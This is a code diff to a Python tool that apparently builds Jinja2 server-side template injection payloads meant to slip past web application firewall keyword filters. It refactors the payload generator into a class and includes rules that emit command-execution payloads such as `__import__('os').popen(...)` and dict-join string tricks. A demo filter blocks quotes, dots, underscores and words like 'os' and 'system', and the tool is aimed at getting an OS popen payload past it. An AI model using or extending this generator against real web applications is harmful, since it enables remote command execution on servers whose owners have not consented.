@@ -39,51 +39,131 @@ def req_gen(f):
     req_gens[gen_type.group(1)].append(f)
 
 
-def generate(gen_type, *args, waf_func: Callable | None = None, context: dict | None = None, cache: dict | None = None) -> str | None:
+class PayloadGenerator:
+    def __init__(self, waf_func, context):
+        self.waf_func = waf_func
+        self.context = context
+        self.cache = {}
+        self.generate_funcs = {
+            LITERAL: self.literal_generate,
+            UNSATISFIED: self.unsatisfied_generate
+        }
 
-    if waf_func is None:
-        raise Exception("waf_func cannot be None")
-    if context is None:
-        context = {}
-    if cache is None:
-        cache = {}
+    def add_cache(self, gen_type, *args, result=None):
+        try:
+            # hash() might fail
+            if (gen_type, *args) in self.cache:
+                return
+            self.cache[(gen_type, *args)] = result
+        except Exception:
+            return
 
-    if (gen_type, *args) in cache:
-        return cache[(gen_type, *args)]    
+    def count_success(self, gen_type, req_gen_func_name):
+        used_count[req_gen_func_name] += 1
+        req_gens[gen_type].sort(key = (lambda gen_func: used_count[gen_func.__name__]), reverse=True)
 
-    if gen_type == LITERAL:
-        value = args[0]
-        if not waf_func(value):
-            return None
-        return value
-    if gen_type == UNSATISFIED:
+    def generate_by_req_list(self, req_list):
+        payload = ""
+        for gen_type, *args in req_list:
+            result = self.generate(gen_type, *args)
+            if not result:
+                return None
+            payload += result
+        return payload
+
+    def literal_generate(self, gen_type, *args):
+        return args[0] if self.waf_func(args[0]) else None
+
+    def unsatisfied_generate(self, gen_type, *args):
         return None
 
-    if gen_type not in req_gens:
-        raise Exception(f"gen_type {gen_type} not found")
+    def cached_generate(self, gen_type, *args):
+        try:
+            # hash() might fail
+            if (gen_type, *args) not in self.cache:
+                return None
+            return self.cache[(gen_type, *args)]
+        except Exception:
+            return None
 
-    for gen_func in req_gens[gen_type].copy():
-        generated_payload = ""
-        son_req = gen_func(context, *args)
-        assert isinstance(
-            son_req, list), f"Wrong son_req {son_req} from {gen_func.__name__}"
-        assert all(isinstance(req_type, str) for req_type, *
-                   others in son_req), f"Wrong son_req {son_req} from {gen_func.__name__}"
-        for son_type, *son_args in son_req:
-            payload = generate(son_type, *son_args,
-                               waf_func=waf_func, context=context, cache=cache)
-            if payload is None:
-                generated_payload = None
-                break
-            generated_payload += payload
-        if generated_payload is not None and waf_func(generated_payload):
-            used_count[gen_func.__name__] += 1
-            req_gens[gen_type].sort(
-                key=lambda f: used_count[f.__name__], reverse=True)
-            cache[(gen_type, *args)] = generated_payload
-            return generated_payload
-    cache[(gen_type, *args)] = None
-    return None
+    def default_generate(self, gen_type, *args):
+
+        if self.cached_generate(gen_type, *args):
+            return self.cached_generate(gen_type, *args)
+
+        if gen_type not in req_gens:
+            raise Exception(f"Required type '{gen_type}' not supported.")
+
+        for req_gen_func in req_gens[gen_type].copy():
+            son_req = req_gen_func(self.context, *args)
+
+            assert isinstance(
+                son_req, list), f"Wrong son_req {son_req} from {req_gen_func.__name__}"
+            assert all(isinstance(gen_type, str) for gen_type, *
+                       args in son_req), f"Wrong son_req {son_req} from {req_gen_func.__name__}"
+
+            payload = self.generate_by_req_list(son_req)
+            if payload:
+                self.count_success(gen_type, req_gen_func.__name__)
+                self.add_cache(gen_type, *args, result=payload)
+                return payload
+
+        self.add_cache(gen_type, *args, result=None)
+        return None
+
+    def generate(self, gen_type, *args):
+        generate_func = self.generate_funcs[gen_type] if gen_type in self.generate_funcs else self.default_generate
+        return generate_func(gen_type, *args)
+
+def generate(gen_type, *args, waf_func: Callable | None = None, context: dict | None = None) -> str | None:
+    payload_generator = PayloadGenerator(waf_func, context)
+    return payload_generator.generate(gen_type, *args)
+
+# def generate(gen_type, *args, waf_func: Callable | None = None, context: dict | None = None, cache: dict | None = None) -> str | None:
+
+#     if waf_func is None:
+#         raise Exception("waf_func cannot be None")
+#     if context is None:
+#         context = {}
+#     if cache is None:
+#         cache = {}
+
+#     if (gen_type, *args) in cache:
+#         return cache[(gen_type, *args)]
+
+#     if gen_type == LITERAL:
+#         value = args[0]
+#         if not waf_func(value):
+#             return None
+#         return value
+#     if gen_type == UNSATISFIED:
+#         return None
+
+#     if gen_type not in req_gens:
+#         raise Exception(f"gen_type {gen_type} not found")
+
+#     for gen_func in req_gens[gen_type].copy():
+#         generated_payload = ""
+#         son_req = gen_func(context, *args)
+#         assert isinstance(
+#             son_req, list), f"Wrong son_req {son_req} from {gen_func.__name__}"
+#         assert all(isinstance(req_type, str) for req_type, *
+#                    others in son_req), f"Wrong son_req {son_req} from {gen_func.__name__}"
+#         for son_type, *son_args in son_req:
+#             payload = generate(son_type, *son_args,
+#                                waf_func=waf_func, context=context, cache=cache)
+#             if payload is None:
+#                 generated_payload = None
+#                 break
+#             generated_payload += payload
+#         if generated_payload is not None and waf_func(generated_payload):
+#             used_count[gen_func.__name__] += 1
+#             req_gens[gen_type].sort(
+#                 key=lambda f: used_count[f.__name__], reverse=True)
+#             cache[(gen_type, *args)] = generated_payload
+#             return generated_payload
+#     cache[(gen_type, *args)] = None
+#     return None
 
 
 # ---
@@ -245,8 +325,9 @@ def gen_integer_context(context: dict, value: int):
             (UNSATISFIED, )
         ]
     return [
-        (LITERAL, [k for k, v in context if v == value][0])
+        (LITERAL, [k for k, v in context.items() if v == value][0])
     ]
+
 
 @req_gen
 def gen_integer_zero(context: dict, value: int):
@@ -282,12 +363,12 @@ def gen_integer_negative(context: dict, value: int):
     ]
 
 
-@req_gen
-def gen_integer_unicode(context: dict, value: int):
-    dis = ord("０") - ord("0")
-    return [
-        (LITERAL, "".join(chr(ord(c) + dis) for c in str(value)))
-    ]
+# @req_gen
+# def gen_integer_unicode(context: dict, value: int):
+#     dis = ord("０") - ord("0")
+#     return [
+#         (LITERAL, "".join(chr(ord(c) + dis) for c in str(value)))
+#     ]
 
 
 @req_gen
@@ -309,7 +390,7 @@ def gen_integer_subtract(context: dict, value: int):
         return [
             (UNSATISFIED, )
         ]
-    to_sub_name, to_sub_value = min(bigger, key = lambda pair: pair[1])
+    to_sub_name, to_sub_value = min(bigger, key=lambda pair: pair[1])
     ints = [pair for pair in ints if pair[1] <= to_sub_value]
     value_left = to_sub_value - value
 
@@ -354,6 +435,7 @@ def gen_string_percent_context(context):
     return [
         (LITERAL, [k for k, v in context.items() if v == "%"][0])
     ]
+
 
 @req_gen
 def gen_string_percent_urlencode1(context):
@@ -477,6 +559,7 @@ def gen_string_percent_lower_c_concat(context):
         (STRING_LOWERC, ),
         (LITERAL, ")"),
     ]
+
 
 @req_gen
 def gen_string_percent_lower_c_cycler(context):
@@ -699,6 +782,7 @@ def gen_string_splitdictjoin(context: dict, value: str):
         req.append((LITERAL, "(dict({}=x)|join)".format(part)))
     return req
 
+
 @req_gen
 def gen_string_splitdictjoin2(context: dict, value: str):
     if not re.match("^[a-zA-Z_]+$", value):
@@ -717,6 +801,7 @@ def gen_string_splitdictjoin2(context: dict, value: str):
     return [
         (LITERAL, "(dict({})|join)".format(",".join(f"{part}=x" for part in parts)))
     ]
+
 
 @req_gen
 def gen_string_splitdictjoin3(context: dict, value: str):
@@ -1031,12 +1116,14 @@ def gen_module_os_config(context):
 
 # ---
 
+
 @req_gen
 def gen_os_popen_obj_eval(context, cmd):
     cmd = cmd.replace("'", "\\'")
     return [
         (EVAL, "__import__('os').popen('" + cmd + "')")
     ]
+
 
 @req_gen
 def gen_os_popen_obj_normal(context, cmd):
@@ -1073,7 +1160,7 @@ if __name__ == "__main__":
     def waf_func(payload: str):
         time.sleep(0.2)
         # print(payload)
-        return all(word not in payload for word in ['\'','"','.', '_', 'import','request','url','\\x','os','system','\\u', '22'])
+        return all(word not in payload for word in ['\'', '"', '.', '_', 'import', 'request', 'url', '\\x', 'os', 'system', '\\u', '22'])
 
     payload = generate(
         OS_POPEN_READ,
